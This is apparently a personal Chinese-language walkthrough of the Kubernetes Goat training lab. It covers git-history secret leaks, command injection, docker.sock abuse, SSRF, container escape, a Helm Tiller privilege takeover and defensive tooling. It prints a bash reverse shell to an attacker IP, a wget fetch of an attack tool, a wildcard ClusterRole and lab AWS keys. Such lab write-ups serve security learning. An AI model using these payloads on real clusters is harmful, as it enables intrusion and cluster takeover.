# Kubernetes Goat

安装官方的配置：https://madhuakula.com/kubernetes-goat/docs/how-to-run/kubernetes-goat-on-kind

修改kind-cluster-setup.yaml：

```shell
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.28.0
    extraMounts:
      - hostPath: /var/run/docker.sock
        containerPath: /var/run/docker.sock
```

即需要具体指定image



然后最后运行的结果是这样：

```bash
kubectl get pods
NAME                                               READY   STATUS             RESTARTS        AGE
batch-check-job-fxkhv                              0/1     Completed          0               15m
build-code-deployment-6ff7b98f7c-cx4rz             1/1     Running            0               15m
health-check-deployment-6b5dbb8bc-7kc4t            1/1     Running            0               15m
hidden-in-layers-pglkv                             1/1     Running            0               15m
internal-proxy-deployment-646b4cfcd7-rvw46         2/2     Running            0               15m
kubernetes-goat-home-deployment-7f8486f6c7-5bvk9   1/1     Running            0               15m
metadata-db-7fbf595cc5-dlh9q                       1/1     Running            0               15m
poor-registry-deployment-877b55d89-fbdw5           1/1     Running            0               15m
system-monitor-deployment-5466d8b787-twqft         0/1     CrashLoopBackOff   5 (2m19s ago)   15m
```

system-monitor-deployment-5466d8b787-twqft因为结构问题（不能arm64）启动不了。



## 1.Sensitive keys in codebases



> Developers tend to commit sensitive information to version control systems. As we are moving towards CI/CD and GitOps systems, we tend to forgot identifying sensitive information in code and commits

使用dirsearch扫描，发现存在.git目录。

拿GitHack将git目录下载下来：

```bash
python2 GitHack.py -u http://127.0.0.1:1230/.git/
```



查看git的log：`git log`

```bash
commit 905dcec070d86ce60822d790492d7237884df60a (HEAD -> master)
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:42:28 2020 +0100

    Final release

commit 3292ff3bd8d96f192a9d4eb665fdd1014d87d3df
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:40:59 2020 +0100

    Updated the docs

commit 7daa5f4cda812faa9c62966ba57ee9047ee6b577
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:39:21 2020 +0100

    updated the endpoints and routes

commit d7c173ad183c574109cd5c4c648ffe551755b576
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:31:06 2020 +0100

    Inlcuded custom environmental variables

commit bb2967a6f26fb59bf64031bbb14b4f3e233944ca
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:28:33 2020 +0100

    Added ping endpoint

commit 599f377bde4c3c5c8dc0d7700194b5b2b0643c0b
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:24:56 2020 +0100

    Basic working go server with fiber

commit 4dc0726a546f59e0f4cda837a07032c62ee137bf
Author: Madhu Akula <madhu.akula@hotmail.com>
Date:   Fri Nov 6 23:21:48 2020 +0100

    Initial commit with README
```

 Inlcuded custom environmental variables这句话很可惜，切换版本：

```bash
git checkout .
git checkout d7c173ad183c574109cd5c4c648ffe551755b576

16:04:21 › ls -al
total 40
drwxr-xr-x   8 feng  staff   256 10 12 16:04 .
drwxr-xr-x   3 feng  staff    96 10 12 15:57 ..
-rw-r--r--   1 feng  staff   182 10 12 16:04 .env
drwxr-xr-x  13 feng  staff   416 10 12 16:04 .git
-rw-r--r--@  1 feng  staff    95 10 12 16:01 README.md
-rw-r--r--   1 feng  staff    76 10 12 16:04 go.mod
-rw-r--r--   1 feng  staff  2432 10 12 16:04 go.sum
-rw-r--r--   1 feng  staff   284 10 12 16:04 main.go

feng at fengs-MBP in [~/ctftools/GitHack-master/dist/127.0.0.1_1230]  on git:d7c173a ✔︎  d7c173a "Inlcuded custom environmental variables"
16:04:22 › cat .env
[build-code-aws]
aws_access_key_id = AKIVSHD6243H22G1KIDC
aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc

```

成功发现了aksk。

说明这种敏感的信息可能不直接出现在文件中，但是可能在git的历史版本中。



## 2.DIND (docker-in-docker) exploitation

主页是一个ping的命令拼接，可以rce。

弹个shell：

```
;bash -c 'bash -i >& /dev/tcp/192.168.0.171/39502 0>&1';
```

进行一下信息收集发现是在容器环境里，全局找一下docker.socket：

```shell
find / -name docker.sock
```

发现在`/custom/docker/docker.sock`。

后续则可以利用这个docker.sock实现进一步利用：

```bash
curl -s --unix-socket /custom/docker/docker.sock -X GET "http://localhost/containers/json"
```



通过mount也可以查找到挂载的信息，里面有docker.sock：

```bash
mount
mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/121/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/120/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/119/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/118/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/117/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/116/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/115/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/114/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/113/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/112/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/111/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/110/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/109/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/122/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/122/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)
/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)
/dev/vda1 on /etc/hostname type ext4 (rw,relatime)
/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
tmpfs on /custom/docker/docker.sock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=915972k,mode=755)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=102400k)
```



也可以使用cdk进行一下信息收集：

```bash
wget http://192.168.0.171:39554/cdk_linux_amd64
./cdk evaluate --full

```

也可以找到：

```bash

[  Information Gathering - Sensitive Files  ]
	/docker.sock - /custom/docker/docker.sock
	/.bashrc - /etc/skel/.bashrc
	/.bash_history - /root/.bash_history
	/.bashrc - /root/.bashrc
	/serviceaccount - /run/secrets/kubernetes.io/serviceaccount
```



## 3.SSRF in the Kubernetes (K8S) world

`169.254.169.254`是动态配置的 IPv4 链路本地地址。它只在单个网段有效，并且不被路由。大多数云提供商使用此地址来为实例提供计算元数据，包括 AWS、GCP Azure、Digital Ocean 等主要提供商。

我们可以继续使用 访问默认实例元数据服务`169.254.169.254`。我们还需要确定该服务使用哪个云提供商来运行此计算，以便我们可以使用特定的标头和查询。如果这不是托管在云提供商中，那么我们可以跳过此步骤并转向内部服务查询，就像 Kubernetes 集群中的其他微服务和内部服务一样。



通过端口查找发现5000端口存在服务，指向了http://metadata-db。访问http://metadata-db下面的latest存放了很多的metadata，最终在http://metadata-db/latest/secrets/kubernetes-goat 找到了目标flag，base64解码即可。

"{\"metadata\": \"static-metadata\", \"data\": \"azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=\"}\n"

## 4.Container escape to the host system

/host-system/目录挂在了宿主机，使用命令：

```bash
chroot /host-system/ bash
```

即可切换作为宿主机的bash（类似于）

然后利用`/var/lib/kubelet/kubeconfig`即可操作apiserver

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```



## 5.Docker CIS benchmarks analysis

主要是使用https://github.com/docker/docker-bench-security这个工具。

检查关于在生产环境中部署Docker容器的几十个常见最佳实践。这些测试都是自动化的。

这种安全扫描类似于安全基线检查，对相应的项进行逐条核查，可以有效地规避一些安全风险。

**其中标红【WARN】是需要改进的，标绿【PASS】表示通过检测，【INFO】项的话，看需要是否进行调整**。

`sh docker-bench-security.sh`

需要注意的是，这个是在主机上进行检查的，而不是在docker容器里。

所以直接本机下载运行一样的。



## 6.Kubernetes CIS benchmarks analysis

类似于5的CIS benchmarks，只不过这个工具是检查k8s的：https://github.com/aquasecurity/kube-bench

```bash
$ kubectl apply -f job.yaml
job.batch/kube-bench created

$ kubectl get pods
NAME                      READY   STATUS              RESTARTS   AGE
kube-bench-j76s9   0/1     ContainerCreating   0          3s

# Wait for a few seconds for the job to complete
$ kubectl get pods
NAME                      READY   STATUS      RESTARTS   AGE
kube-bench-j76s9   0/1     Completed   0          11s

# The results are held in the pod's logs
kubectl logs kube-bench-j76s9
[INFO] 1 Master Node Security Configuration
[INFO] 1.1 API Server
...
```



## 7.Attacking private registry

主要是攻击docker private registry。

官方文档：https://docs.docker.com/registry/spec/api/

一般可能要需要auth，环境是不需要的。

```bash
#列出所有镜像
/v2/_catalog

#检查镜像是否存在以及tag列表
/v2/<name>/tags/list

#获取镜像信息,reference可以是获取的tag或者digest
/v2/<name>/manifests/<reference>
```

访问http://127.0.0.1:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest下载镜像信息，可以找到：

![image-20231013103247554](Kubernetes%20Goat.assets/image-20231013103247554.png)

`docker`通过使用客户端将图像下载到本地并进行分析，可以更进一步。另外在某些情况下，您甚至可以根据权限和特权将映像推送到注册表。

## 8.NodePort exposed services

指的是k8s的一个配置问题。

可以找到service：

```bash
apiVersion: v1
kind: Service
metadata:
  name: internal-proxy-info-app-service
  namespace: default
spec:
  type: NodePort
  ports:
  - protocol: TCP
    port: 5000
    targetPort: 5000
    nodePort: 30003
  selector:
    app: internal-proxy
```

把internal-proxy内部的5000端口（这是上面ssrf才能访问的内部端口）通过nodePort的方式映射到了节点的30003端口。导致了外部也可以通过节点的30003端口访问内部的5000端口服务：

```bash
root@kubernetes-goat-cluster-control-plane:/# curl http://172.19.0.4:30003/
{"info": "Refer to internal http://metadata-db for more information"}
```

## 9.Helm v2 tiller to PwN the cluster

https://docs.bitnami.com/tutorials/exploring-helm-security

https://github.com/Ruil1n/helm-tiller-pwn

Helm 是 Kubernetes 的包管理器。包管理器类似于我们在 Ubuntu 中使用的apt、Centos中使用的yum 或者Python中的 pip 一样，能快速查找、下载和安装软件包。Helm 由客户端组件 helm 和服务端组件 Tiller 组成, 能够将一组K8S资源打包统一管理, 是查找、共享和使用为Kubernetes构建的软件的最佳方式。



- **helm** 是一个命令行工具，用于本地开发及管理chart，chart仓库管理等
- **Tiller** 是 Helm 的服务端。Tiller 负责接收 Helm 的请求，与 k8s 的 apiserver 交互，根据chart 来生成一个 release 并管理 release
- **chart** Helm的打包格式叫做chart，所谓chart就是一系列文件, 它描述了一组相关的 k8s 集群资源
- **release** 使用 helm install 命令在 Kubernetes 集群中部署的 Chart 称为 Release
- Repoistory Helm chart 的仓库，Helm 客户端通过 HTTP 协议来访问存储库中 chart 的索引文件和压缩包

在Helm2开发的时候，Kubernetes的RBAC体系还没有建立完成，Kubernetes社区直到2017年10月份v1.8版本才默认采用了RBAC权限体系，所以Helm2的架构设计是存在一定安全风险的。Helm3是在Helm2之上的一次大更改，于2019年11月份正式推出，同时Helm2开始退出历史舞台，到2020年的11月开始停止安全更新。



所以helm2的tiller是有安全风险的：

> 从kubernetes 1.6开始默认开启RBAC。这是Kubernetes安全性/企业可用的一个重要特性。但是在RBAC开启的情况下管理及配置Tiller变的非常复杂。为了简化Helm的尝试成本我们给出了一个不需要关注安全规则的默认配置。但是，这会导致一些用户意外获得了他们并不需要的权限。并且，管理员/SRE需要学习很多额外的知识才能将Tiller部署的到关注安全的生产环境的多租户K8S集群中并使其正常工作。

Helm2这种架构设计下Tiller组件通常会被配置为非常高的权限，也因此会造成安全风险。

1. 对外暴露端口
2. 拥有和Kubernetes通信时的高权限（可以进行创建，修改和删除等操作）



**默认情况下，tiller 在集群内公开其 gRPC 端口，无需身份验证。**这意味着集群内的任何pod都可以要求 Tiller 安装一个chart，该chart安装新的 ClusterRoles，授予本地 Pod 任意、提升的 RBAC 权限。



tiller默认安装在namespace为`kube-system`，service-name为`tiller-deploy`，端口为44134。

通过命令`helm --host tiller-deploy.kube-system:44134 version`来与tiller通信。

这时候正常拿secret是没权限的：`kubectl get secrets -n kube-system`



那么现在我们需要获取到整个集群的权限，换而言之现在我们希望拥有一个可以访问所有namespace的ServiceAccount，在这里我们可以把default这个service account（当前账户）赋予ClusterRole RBAC中的全部权限。这个时候我们就需要用到ClusterRole和ClusterRoleBinding这两种对象了。



ClusterRole

```yaml
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRole
metadata:
  name: all-your-base
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
 
```



ClusterRoleBinding

```yaml
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRoleBinding
metadata:
  name: belong-to-us
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: all-your-base
subjects:
  - kind: ServiceAccount
    namespace: {{ .Values.namespace }}
    name: {{ .Values.name }}
```



恶意的chart：https://github.com/Ruil1n/helm-tiller-pwn

下载下来放到容器里后，安装：`helm --host tiller-deploy.kube-system:44134 install --name pwnchart /pwnchart`

之后再执行`kubectl get secrets -n kube-system`就可以成功了。

## 10.Analyzing crypto miner container

即现在的黑客会把藏有挖矿程序的image推送到仓库中，用户如果下载了这样的恶意镜像并且使用则会被攻击。

```bash
kubectl get jobs -A
NAMESPACE   NAME               COMPLETIONS   DURATION   AGE
default     batch-check-job    1/1           9m20s      4d
default     hidden-in-layers   0/1           4d         4d
default     kube-bench         1/1           22s        3d5h
```

发现有batch-check-job。

```bash
kubectl describe job batch-check-job
Name:             batch-check-job
Namespace:        default
Selector:         batch.kubernetes.io/controller-uid=1400b622-de71-442f-a321-51d2155e7b10
Labels:           batch.kubernetes.io/controller-uid=1400b622-de71-442f-a321-51d2155e7b10
                  batch.kubernetes.io/job-name=batch-check-job
                  controller-uid=1400b622-de71-442f-a321-51d2155e7b10
                  job-name=batch-check-job
Annotations:      <none>
Parallelism:      1
Completions:      1
Completion Mode:  NonIndexed
Start Time:       Thu, 12 Oct 2023 15:32:53 +0800
Completed At:     Thu, 12 Oct 2023 15:42:13 +0800
Duration:         9m20s
Pods Statuses:    0 Active (0 Ready) / 1 Succeeded / 0 Failed
Pod Template:
  Labels:  batch.kubernetes.io/controller-uid=1400b622-de71-442f-a321-51d2155e7b10
           batch.kubernetes.io/job-name=batch-check-job
           controller-uid=1400b622-de71-442f-a321-51d2155e7b10
           job-name=batch-check-job
  Containers:
   batch-check:
    Image:        madhuakula/k8s-goat-batch-check
    Port:         <none>
    Host Port:    <none>
    Environment:  <none>
    Mounts:       <none>
  Volumes:        <none>
Events:           <none>

```

可以看到其镜像为`madhuakula/k8s-goat-batch-check`。

也可以通过查找job运行的pod的详细信息来看：

```bash
kubectl get pods --namespace default -l "job-name=batch-check-job"
kubectl get pod batch-check-job-xxxx -o yaml
```

使用docker history命令来分析镜像每一层执行的命令，`--no-trunc`是不要截断输出：

```bash
docker history --no-trunc madhuakula/k8s-goat-batch-check
```

## 11.Kubernetes namespaces bypass

Kubernetes 中有不同的命名空间并且资源被部署和管理时，它们是安全的并且无法相互访问。

默认情况下，Kubernetes 使用平面网络架构，这意味着集群中的任何 pod/服务都可以与其他人通信。

默认情况下，集群内的命名空间没有任何网络安全限制。命名空间中的任何人都可以与其他命名空间通信。



进入容器后是要进行端口扫描的，省略这一步后就可以发现redis服务器。进入查找key就可以获取到flag。

因此环境的意思可能就是可以访问其他namespaces的服务：

```bash
kubectl get pods -n secure-middleware
NAME                                      READY   STATUS    RESTARTS      AGE
cache-store-deployment-5598675864-4bmgp   1/1     Running   4 (22h ago)   4d
```

## 12.Gaining environment information

k8s的每个环境中都有很多信息可以获取：

```bash
cat /proc/self/cgroup
cat /etc/hosts
mount
printenv
```

## 13.DoS the Memory/CPU resources

假如Kubernetes部署的yaml文件没有对资源的使用进行限制，那么攻击者可能就可以消耗pod/deployment的资源，从而对Kubernetes造成DOS

```bash
#–vm是启动8个worker去匿名mmap
#–vm-bytes是每个worker分配的内存
#–timeout就是压力测试60s后停止
stress-ng --vm 8 --vm-bytes 16G --timeout 60s
```

## 14.Hacker container preview

一个已经有各种工具的容器。没啥用



## 15.Hidden in layers

```bash
docker inspect madhuakula/k8s-goat-hidden-in-layers
docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers
```



也可以使用dive来分析镜像：

```bash
dive <your-image-tag>
```



如果某些文件只在docker的某一层中：

```bash
#导出映像
docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar

#解压之后，文件夹里面的每个tar都是一层，通过dive给定的id去对应层查看
cd da73da4359e9edb793ee5472ae3538be8aec57c27efff7dae8873566c865533f
tar -xvf layer.tar

```

## 16.RBAC least privileges misconfiguration

Kubernetes早期并没有RBAC（基于角色的访问控制）的概念，大多采用ABAC（基于属性的访问控制）。现在它拥有像RBAC这样的超能力来实现最小权限的安全原则。尽管如此，大多数现实世界的工作负载和资源最终都会拥有比预期更广泛的特权。



具体操作就是利用service account

## 17.KubeAudit - Audit Kubernetes clusters

即使用kubeaudit工具审计k8s集群。

```bash
kubeaudit all
```



## 18.Falco - Runtime security monitoring & detection

https://falco.org/zh-cn/docs/

`Falco`云原生运行时安全项目。是 Kubernetes 威胁检测引擎。Falco 检测意外的应用程序行为并在运行时发出威胁警报。



- Falco 通过以下方式使用系统调用来保护和监控系统：
  - 在运行时解析来自内核的 Linux 系统调用
  - 针对强大的规则引擎断言流
  - 违反规则时发出警报
- Falco 附带了一组默认规则，用于检查内核是否存在异常行为，例如：
  - 使用特权容器进行权限提升
  - 使用以下工具更改命名空间`setns`
  - 读取/写入众所周知的目录，例如 /etc、/usr/bin、/usr/sbin 等
  - 创建符号链接
  - 所有权和模式变化
  - 意外的网络连接或套接字突变
  - 使用 execve 生成进程
  - 执行 shell 二进制文件，例如 sh、bash、csh、zsh 等
  - 执行 SSH 二进制文件，例如 ssh、scp、sftp 等
  - 改变 Linux coreutils 可执行文件
  - 改变登录二进制文件
  - 改变shadowutil或passwd可执行文件，例如shadowconfig、pwck、chpasswd、getpasswd、change、useradd等。





```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco

#从falco中读取日志
kubectl logs -f -l app=falco
```

## 19.Popeye - A Kubernetes cluster sanitizer

https://github.com/derailed/popeye



使用 cluster-admin 令牌权限在集群中运行：

```bash
popeye
```

## 20.Secure Network Boundaries using NSP

Kubernetes 具有扁平的网络架构。这意味着如果您想创建网络边界，则需要在 CNI 的帮助下创建称为网络策略的内容。



```bash
kubectl run --image=nginx website --labels app=website --expose --port 80

kubectl run --rm -it --image=alpine temp -- sh

#发现可以访问的到
wget -qO- http://website


```

设置一个NetworkPolicy：

```yaml
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: website-deny
spec:
  podSelector:
    matchLabels:
      app: website
  policyTypes:
  - Ingress
```



```bash
kubectl apply -f website-deny.yaml
```

再访问就会访问不到（可是我还能访问得到？？？）

## 21.Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement

使用工具tracingpolicy。

## 22.Securing Kubernetes Clusters using Kyverno Policy Engine

使用Kyverno。

TODO
